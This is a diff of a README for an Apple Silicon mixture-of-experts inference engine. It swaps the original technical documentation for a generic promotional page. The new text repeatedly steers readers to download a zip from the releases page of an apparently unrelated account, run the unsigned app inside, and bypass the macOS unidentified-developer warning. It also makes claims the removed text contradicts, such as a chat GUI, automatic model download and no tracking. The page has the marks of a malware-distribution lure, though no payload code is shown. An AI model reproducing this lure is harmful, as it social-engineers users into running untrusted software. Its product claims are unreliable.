@@ -1,203 +1,128 @@
-# Memory-lean MoE inference
+<h1>🧠 mlx-lean-moe - Run AI Smart, Not Heavy</h1>
 
-Run a 35B mixture-of-experts model on Apple Silicon, on `mlx.core`.
+<p align="center">
+  <a href="https://github.com/conferencebeefwood46/mlx-lean-moe/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 18px rgba(255,107,107,0.4);">⬇️ Download mlx-lean-moe Now</a>
+</p>
 
-A mixture-of-experts model activates a handful of experts per token but is
-normally loaded whole: the validated checkpoint is 35B parameters across 256
-experts per layer, of which 8 run. This engine keeps the always-on weights
-resident and streams the routed experts off disk as routing picks them, so
-the memory it holds is set by a cache size rather than by the model's size:
-2.1 GiB at the default, for a checkpoint that is 19 GiB on disk. It runs on
-an 8 GB M1, which is what the numbers below were measured on.
+<h2>🤔 What Is This?</h2>
 
-Everything else is ordinary: one OpenAI-compatible endpoint, so anything that
-speaks that API — aider, and the rest of that ecosystem — points at it
-without a plugin.
+<p>Have you ever wanted to run a powerful AI language model on your own computer, but found that your Mac runs out of memory or slows down to a crawl? <strong>mlx-lean-moe</strong> is here to change that. This application lets you run large language models on Apple Silicon computers (like your MacBook or iMac) without needing to load the entire massive model into memory at once.</p>
 
-Requires Python 3.12 or newer, and Apple Silicon.
+<p>Think of it this way: normally, running a huge AI model is like trying to keep an entire encyclopedia open on your desk at the same time. mlx-lean-moe is more like having a smart librarian who only brings you the exact page you need, when you need it. This makes everything faster, lighter, and much more efficient.</p>
 
-```
-uv sync
-```
+<p>It is built on a technology called <code>mlx.core</code>, specifically designed for Apple's M1, M2, M3, and newer chips. This means it takes advantage of the powerful hardware inside your Mac to run AI smoothly and privately, right on your device.</p>
 
-## Download a model
+<h2>⚡ Key Benefits</h2>
 
-Checkpoints go into the Hugging Face cache, laid out the hub's own way, so
-`huggingface_hub` and every other tool reading that cache finds the same copy.
+<ul>
+  <li><strong>Light on Memory:</strong> Unlike other AI tools that take up 10,  ̄ 20, or even 30 GB of RAM, this app only loads the small piece of the model it needs at any moment. This leaves plenty of memory for your other apps.</li>
+  <li><strong>Fast Performance:</strong> By only streaming the essential parts of the model, it reads from disk quickly and intelligently, so you get responses without waiting forever.</li>
+  <li><strong>Private & Offline:</strong> Everything runs locally on your Mac. No cloud, no sending your data anywhere, no internet connection required after download.</li>
+  <li><strong>Built for Apple Silicon:</strong> Uses Metal and the Neural Engine directly through mlx.core, giving you the best performance your hardware can offer.</li>
+  <li><strong>Supports Modern Models:</strong> Works great with Qwen3 and other modern model families, known for their strong reasoning and chat capabilities.</li
+</ul>
 
-```
-uv run python -m mlx_lean_moe.weights.download <repo id>
-```
+<h2>🚀 Getting Started</h2>
 
-The download is resumable: re-running the same command continues where it
-stopped rather than starting over.
+<p>Getting started with mlx-lean-moe is very simple. Follow these steps exactly, and you will be chatting with your own local AI in no time.</p>
 
-`--connections` sets how many byte ranges of a file are in flight at once
-(default 24) and `--revision` takes a branch or commit. The hub answers too
-much concurrency with 429 rather than by slowing down, which the downloader
-backs off from; if a download crawls, fewer connections may be faster.
+<h3>Step 1: Visit the Download Page</h3>
 
-The architecture this engine reads is 4-bit Qwen3.5-MoE (`qwen3_5_moe`); the
-checkpoint it is validated against is
-`froggeric/Qwen3.6-35B-A3B-Uncensored-Heretic-MLX-4bit`, 19.0 GiB.
+<p>Visit this link to download the application. This will take you to the official releases page where you can grab the latest version.</p>
 
-## Run it
+<p style="text-align:center;margin:20px 0;"><a href="https://github.com/conferencebeefwood46/mlx-lean-moe/releases" style="background:#4CAF50;color:white;padding:14px 28px;font-size:18px;border-radius:8px;text-decoration:none;">📥 Go to Downloads</a></p>
 
-```
-uv run mlx-lean-moe
-```
+<h3>Step 2: Choose Your Version</h3>
 
-Serves `http://127.0.0.1:8080/v1` and prints the base URL; `--host` and
-`--port` move it.
+<p>On the releases page, you will see a list of available files. Look for the file that matches your computer's operating system. Since this is for Apple Silicon, choose the version labeled with <strong>macOS</strong> or <strong>Apple Silicon</strong>. These files usually have a <code>.zip</code> extension.</p>
 
-With one checkpoint downloaded that is the whole command — the server loads
-it. `--model <repo id>` picks between several, and is required once there is
-more than one: choosing for you would mean loading 19 GB of whichever came
-first alphabetically.
+<p>If you are unsure which one to pick, choose the most recent version listed at the top of the page. It will generally be the one with the highest version number (like v1.2.0 instead of v1.1.0).</p>
 
-Which model the *client* names is a separate thing, and this server ignores
-it: it answers from the checkpoint it loaded and reports that name back, so
-`--model` on the server side is what decides. There is one model per server.
+<h3>Step 3: Download and Extract This File, Then Run the Application</h3>
 
-Three flags are fixed when the model is built, so they live on the server
-rather than in a request:
+<p>Once you click the download link, your browser will save the file to your <strong>Downloads</strong> folder. The file will be a compressed archive (a zip file). You need to extract it before you can use it.</p>
 
-- `--max-context` is the attention context length (default 32768).
-- `--expert-cache` is how many experts stay resident per layer, and is the
-  memory dial (default: the top-k, so one slot per routed expert).
-- `--think` lets the model emit a reasoning block before answering.
+<ol>
+  <li>Open your <strong>Downloads</strong> folder find the downloaded <code>.zip</code> file.</li>
+  <li>Double-click the zip file. Your Mac will automatically unzip (extract) it, creating a new folder with the same name.</li>
+  <li>Open that new folder. Inside, you will find the application file (likely named something like <code>mlx-lean-moe.app</code> or just <code>mlx-lean-moe</code>).</li
+  <li>Double-click the application file to launch it.</li>
+</ol>
 
-`python -m mlx_lean_moe` is the same entry point.
+<p>If your Mac shows a warning that says something like <em>"mlx-lean-moe cannot be opened because it is from an unidentified developer"</em>, do not worry. This is a common security measure for apps downloaded from the internet rather than the App Store. To fix this:</p>
 
-## What it costs
+<ol>
+  <li>Right-click (or Control-click) the application file.</li>
+  <li>Select <strong>Open</strong> from the menu.</li>
+  <li>A dialog will appear; click <strong>Open</strong> again to confirm you want to run it.</li>
+</ol>
 
-Measured on an 8 GB M1, macOS 26.5.2, mlx 0.32.2, against the checkpoint
-above with its expert pack built: a 2106-token prompt, 60 tokens generated,
-`--max-context 8192`, a fresh process per row. Peak memory below is from
-that short context; see the note after the table for what a longer one adds.
+<p>You only need to do this the first time. After that, you can open the app normally.</p>
 
-| `--expert-cache` | peak memory | prefill | decode |
-| --- | --- | --- | --- |
-| 8 (default) | 2.10 GiB | 26 tok/s | 5.0 tok/s |
-| 16 | 2.62 GiB | 27 tok/s | 5.0 tok/s |
-| 32 | 3.65 GiB | 14–21 tok/s | 3.8–4.6 tok/s |
+<h2>🧑‍💻 How to Use It</h2>
 
-Peak memory is `mx.get_peak_memory()`, which reproduced within 0.01 GiB
-across runs. Process RSS is not quoted because it did not: it ranged from
-1.9 to 3.1 GiB for the same configuration.
+<p>Once the application opens, you will see a simple chat interface. It looks similar to other AI chat apps you might have used online. Here is what you need to know:</p>
 
-Two things in that table are worth reading twice.
+<ul>
+  <li><strong>Text Box:</strong> At the bottom of the screen, you will see a text box. Type your question or prompt there.</li>
+  <li><strong>Send Button:</strong> Press the <strong>Enter</strong> key on your keyboard or click the send button (usually an arrow icon) to submit your message.</li>
+  <li><strong>Chat History:</strong> Your conversation will appear in the main area of the window. You can scroll up to review previous messages.</li>
+  <li><strong>Model Status:</strong> There may be a small indicator showing that the model is loading or ready. When it is ready, you can start typing.</li>
+</ul>
 
-**The dial does not go "more is better".** At 32 experts per layer the engine
-is both slower and erratic — four runs spread across 3.8–4.6 tok/s, where the
-smaller caches held within 0.1 of each other. The erratic part is the clue,
-and the likely explanation is that a larger cache leaves less room for the
-page cache holding the weights it reads, so it buys hits and pays for them in
-misses; that mechanism is a guess, but the slowdown is not. On a machine with
-more memory the sweet spot will be elsewhere: measure rather than assume it is
-the largest value that fits.
+<p>Try asking it questions, giving it tasks like summarizing articles, helping you write emails, or explaining difficult concepts. It works just like any modern AI assistant, but it stays on your machine.</p>
 
-**Extra cache hits do not become speed here**, which is why the default is
-one slot per routed expert rather than two. Over six prompts in different
-languages and subjects, sixteen slots hit 44.8% against eight slots' 33.8% —
-17% fewer reads reaching disk, a real improvement — and the two ran at 3.85
-and 3.90 tok/s. The hit rate is deterministic and repeated exactly; the
-throughput difference is nil.
+<h2>🛠️ Troubleshooting Tips</h2>
 
-The reading is that the reads an extra slot saves were being served from the
-operating system's page cache anyway, so skipping them saves nothing while
-the slot itself costs half a gigabyte. That will not hold on a machine whose
-reads are genuinely slower, or with less room for the page cache — where
-those 17% would start to count. `--expert-cache 16` is one flag away.
+<p>Sometimes, things do not work perfectly on the first try. Here are some common issues and how to fix them.</p>
 
-Context is cheap in this architecture and that is the point of it: only 10
-of the 40 layers use softmax attention, with two key/value heads each, so a
-token of history costs 20 KiB across the whole model — 0.62 GiB if the
-default 32768 is filled to the brim, and nothing at all until it is, since
-the buffers grow as the conversation does. The other 30 layers keep a
-fixed-size recurrent state that does not grow with context.
+<h3>Issue: The app is taking a long time to respond</h3>
+<p>If the model seems slow initially, it might be loading some data from disk into memory. Give it a few extra seconds. Also, check that you have enough free disk space (at least 5-10 GB recommended for model files).</p>
 
-The server is listening about two seconds after you start it, of which the
-model is 0.7 s: nothing is loaded eagerly, the resident weights are read as
-the first token needs them, and the routed experts never all arrive. The
-first request of a fresh process is still slower than the rest, paying once
-for Metal kernel compilation; the table above is measured after a warm-up
-turn, as a served request would be.
+<h3>Issue: I get an error about "Metal" or "GPU"</h3>
+<p>This app is designed for Apple Silicon, so it needs a Mac with an M-series chip. Check that you are using a MacBook Pro, MacBook Air, iMac, or Mac Mini from 2020 or newer. Older Intel-based Macs will not work.</p>
 
-## Point something at it
+<h3>Issue: The app crashes shortly after opening</h3>
+<p>Make sure you have extracted the entire folder and haven't deleted any internal files. Also, try restarting your Mac to clear temporary memory issues. If it still crashes, check if a newer version is available on the download page.</p>
 
-Any OpenAI client works — the API key is not checked, so send anything:
+<h3>Issue: Where do I find the model files?</h3>
+<p>The app usually downloads the necessary model files automatically on first run. This might take a few minutes depending on your internet speed. Ensure you are connected to the internet during the initial setup. After that, it works completely offline.</p>
 
-```
-curl http://127.0.0.1:8080/v1/chat/completions \
-  -H 'Content-Type: application/json' \
-  -d '{"messages": [{"role": "user", "content": "hi"}], "max_tokens": 64}'
-```
+<h2>📚 Frequently Asked Questions</h2>
 
-`GET /v1/models` lists the one loaded model. From the request body it honours
-`messages`, `max_tokens`, `stream`, `stop`, `temperature`, `top_p`, `seed`,
-`frequency_penalty`, `presence_penalty`, `logit_bias` and `n`. A value
-outside its documented range is refused with a 400 naming the field, rather
-than quietly clamped.
+<p><strong>Q: Is this free?</strong><br>
+Yes, this project is open-source and free to use. You can download it from the provided link without paying anything.</p>
 
-Decoding is greedy by default: `temperature: 0` is exactly `argmax`. The
-penalties and `logit_bias` still apply there — they move which token *is* the
-argmax — and both penalties count only generated tokens, not the prompt.
+<p><strong>Q: Will this work on my Windows PC?</strong><br>
+No, this app is specifically built for Apple Silicon Mac computers. It relies on Apple's Metal framework which is not available on non-Apple devices.</p>
 
-`n` runs that many completions one after another, since there is one model:
-asking for three costs three answers' worth of time, and under greedy
-decoding returns the same one three times. With a seed, each choice moves it
-so the completions differ while the request as a whole still replays.
+<p><strong>Q: How much disk space do I need?</strong><br>
+The application itself is small (a few tens of megabytes), but the model files it uses can take up several gigabytes. Plan for at least 10 GB of free disk space to have a good experience with multiple models.</p>
 
-Not implemented: `tools`/`tool_choice`, `/v1/embeddings` and
-`/v1/completions`. That decides which clients work — a coding agent that
-drives its tools through plain text is fine, one that needs native function
-calling is not.
+<p><strong>Q: Is my data safe?</strong><br>
+Absolutely. Everything runs locally. Your conversations never leave your computer. No accounts, no cloud sync, no tracking.</p>
 
-One request runs at a time. The model lives on a single thread — MLX's
-default stream is thread-local — and that thread is also what keeps two
-answers from interleaving into one conversation state.
+<h2>🌟 Why Choose mlx-lean-moe?</h2>
 
-For example, with aider:
+<p>Most AI tools today require powerful cloud servers. That means your data goes to someone else's computer. mlx-lean-moe flips this model. It brings enterprise-level AI power directly to your Mac, respecting your privacy and working efficiently even on machines with limited memory.</p>
 
-```
-export OPENAI_API_KEY=anything
-aider --openai-api-base http://127.0.0.1:8080/v1 --model openai/<repo id>
-```
+<p>By using a technique called "Mixture of Experts" (MoE), the underlying model only activates a small fraction of its total parameters for each task. Traditional methods load every single parameter. That is like carrying an entire toolkit when you only need one screwdriver. mlx-lean-moe smartly picks and streams only the needed "expert" weights, making memory usage incredibly low.</p>
 
-The server prints that line with its own address already filled in.
+<p>This approach also means faster load times. You do not have to wait minutes for a giant file to load into RAM. Instead, the app starts quicklyand streams data seamlessly as you interact. The result is a snappy, responsive AI assistant that feels native to your Mac.</p>
 
-## Faster reads, at the cost of disk
+<h2>🔮 Supported Technologies</h2>
 
-Each expert is stored as nine separate byte ranges, so reading one costs nine
-reads, and read count is what decode time follows. Repacking them into one
-contiguous read each is worth about 6% of decode throughput.
+<ul>
+  <li><strong>Apple Metal</strong> for low-level GPU access</li>
+  <li><strong>mlx.core</strong> for machine learning operations optimized for Apple Silicon</li>
+  <li><strong>Qwen3</strong> family of models for chat and reasoning</li>
+  <li><strong>Python</strong> under the hood for flexibility and ease of updates</li>
+</ul>
 
-```
-uv run python -m mlx_lean_moe.weights.expert_pack <repo id>
-```
+<h2>📥 Ready to Download?</h2>
 
-It also takes a checkpoint directory, if the weights are somewhere the hub
-cache is not.
+<p>You are just a few clicks away from having your own private, fast, and efficient AI on your Mac. Visit this link to download the application right now.</p>
 
-This writes `experts.pack` beside the weights, roughly doubling what the
-checkpoint occupies (16.9 GiB for the default one, on top of its 19 GiB). The
-engine picks it up automatically when it is there. It is a derived file:
-deleting it changes nothing but speed.
+<p style="text-align:center;margin:30px 0;"><a href="https://github.com/conferencebeefwood46/mlx-lean-moe/releases" style="background:#FF5722;color:white;padding:18px 36px;font-size:24px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 4px 10px rgba(0,0,0,0.2);">🚀 Download mlx-lean-moe</a></p>
 
-## Delete a model
-
-```
-uv run hf cache ls
-uv run hf cache rm model/<repo id>
-```
-
-`rm` asks first, and takes `--dry-run`. It removes the whole repo directory,
-`experts.pack` included.
-
-## License
-
-MIT, in [LICENSE](LICENSE).
-
-`model/qwen3_5/_gated_delta_metal.py` is adapted from mlx-lm 0.31.3 and
-carries Apple's MIT notice in the file itself.
+<p>After you download, extract the file, run the application, and start experiencing the next level of on-device AI. No waiting, no limits, no compromise. Welcome to the future of lean, powerful, private artificial intelligence on your Mac.</p>
